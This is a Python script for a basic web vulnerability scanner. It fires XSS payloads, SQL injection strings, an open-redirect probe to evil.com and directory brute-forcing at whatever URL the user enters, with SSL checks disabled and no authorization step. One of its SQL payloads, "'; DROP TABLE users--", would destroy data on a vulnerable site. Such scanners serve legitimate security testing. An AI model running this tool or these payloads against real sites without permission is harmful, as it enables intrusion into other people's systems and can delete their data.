import requests
from urllib.parse import urlparse, urljoin
from bs4 import BeautifulSoup

# Disable SSL warnings
requests.packages.urllib3.disable_warnings()

# Common payloads
XSS_PAYLOADS = [
    "<script>alert('XSS')</script>",
    "'\"><img src=x onerror=alert(1)>",
    "<svg onload=alert(1)>",
    "'><svg/onload=alert(1337)>"
]

SQLI_PAYLOADS = [
    "' OR '1'='1",
    "' UNION SELECT NULL, NULL--",
    "'; DROP TABLE users--"
]

DIRECTORIES = [
    "admin", "login", "dashboard", "config", "uploads", "includes", "backup", "test", "images"
]

SECURITY_HEADERS = [
    "Content-Security-Policy",
    "X-Frame-Options",
    "Strict-Transport-Security",
    "X-XSS-Protection"
]


def check_waf(url):
    print("[+] Checking for WAF...")
    try:
        resp = requests.get(url, verify=False, timeout=10)
        headers = resp.headers
        waf_headers = ["X-WAF", "X-Block", "CF-RAY", "Server"]
        for header in waf_headers:
            if header in headers and "cloudflare" in headers.get(header, "").lower():
                print(f"[!] WAF detected: {headers.get(header)}")
                return
        print("[-] No WAF detected.")
    except:
        print("[!] Error checking WAF.")


def check_security_headers(url):
    print("[+] Checking Security Headers...")
    try:
        resp = requests.get(url, verify=False, timeout=10)
        missing_headers = [h for h in SECURITY_HEADERS if h not in resp.headers]
        if missing_headers:
            print(f"[!] Missing Security Headers: {', '.join(missing_headers)}")
        else:
            print("[+] All essential security headers present.")
    except:
        print("[!] Error checking security headers.")


def test_sql_injection(url):
    print("[+] Testing for SQL Injection...")
    vulnerable = False
    for payload in SQLI_PAYLOADS:
        test_url = url + payload
        try:
            resp = requests.get(test_url, verify=False, timeout=10)
            errors = ["sql syntax", "mysql", "syntax error", "database error"]
            if any(e in resp.text.lower() for e in errors):
                print(f"[!] Possible SQL Injection vulnerability with payload: {payload}")
                vulnerable = True
                break
        except:
            continue
    if not vulnerable:
        print("[-] No SQL Injection detected.")


def test_xss(url):
    print("[+] Testing for XSS in URL and Forms...")
    vulnerable = False
    for payload in XSS_PAYLOADS:
        # Test in URL parameter
        if "?" in url:
            test_url = url.split("=")[0] + "=" + payload
            try:
                resp = requests.get(test_url, verify=False, timeout=10)
                if payload in resp.text:
                    print(f"[!] XSS vulnerability detected with payload: {payload}")
                    vulnerable = True
                    break
            except:
                continue
    if not vulnerable:
        print("[-] No XSS detected in URL.")

    # Test in Forms
    try:
        resp = requests.get(url, verify=False, timeout=10)
        soup = BeautifulSoup(resp.text, "html.parser")
        forms = soup.find_all("form")
        if forms:
            print(f"[+] Found {len(forms)} form(s). Testing for XSS...")
            for form in forms:
                action = form.get("action")
                form_url = urljoin(url, action)
                inputs = form.find_all("input")
                data = {}
                for inp in inputs:
                    if inp.get("type") != "submit":
                        data[inp.get("name")] = XSS_PAYLOADS[0]
                r = requests.post(form_url, data=data, verify=False)
                if XSS_PAYLOADS[0] in r.text:
                    print(f"[!] XSS vulnerability in form at {form_url}")
                    vulnerable = True
        else:
            print("[-] No forms found for XSS testing.")
    except:
        print("[!] Error testing forms for XSS.")


def check_open_redirect(url):
    print("[+] Testing for Open Redirect...")
    try:
        if "?" in url:
            test_url = url.split("=")[0] + "=https://evil.com"
            resp = requests.get(test_url, allow_redirects=False, verify=False)
            if resp.status_code in [301, 302] and "evil.com" in resp.headers.get("Location", ""):
                print(f"[!] Open Redirect detected at {test_url}")
            else:
                print("[-] No Open Redirect detected.")
        else:
            print("[-] URL does not contain parameters to test for redirects.")
    except:
        print("[!] Error testing for open redirect.")


def check_csrf(url):
    print("[+] Checking for CSRF tokens in forms...")
    try:
        resp = requests.get(url, verify=False)
        soup = BeautifulSoup(resp.text, "html.parser")
        forms = soup.find_all("form")
        for form in forms:
            if "csrf" in form.text.lower() or any("csrf" in inp.get("name", "").lower() for inp in form.find_all("input")):
                print("[+] CSRF token found in form.")
                return
        print("[!] No CSRF token found in forms! (Potential CSRF vulnerability)")
    except:
        print("[!] Error checking CSRF tokens.")


def directory_bruteforce(url):
    print("[+] Performing Directory Brute Forcing...")
    found = []
    for d in DIRECTORIES:
        test_url = urljoin(url, d)
        try:
            resp = requests.get(test_url, verify=False, timeout=5)
            if resp.status_code == 200:
                found.append(test_url)
        except:
            continue
    if found:
        print(f"[!] Found Directories: {', '.join(found)}")
    else:
        print("[-] No directories found.")


if __name__ == "__main__":
    target_url = input("Enter the target URL (e.g., https://example.com/page?param=): ").strip()
    if not target_url.startswith("http"):
        print("[!] Please enter a valid URL starting with http or https.")
        exit()

    print("\n[+] Scanning for vulnerabilities...\n")

    check_waf(target_url)
    check_security_headers(target_url)
    test_sql_injection(target_url)
    test_xss(target_url)
    check_open_redirect(target_url)
    check_csrf(target_url)
    directory_bruteforce(target_url)

    print("\n[+] Scan Completed.")
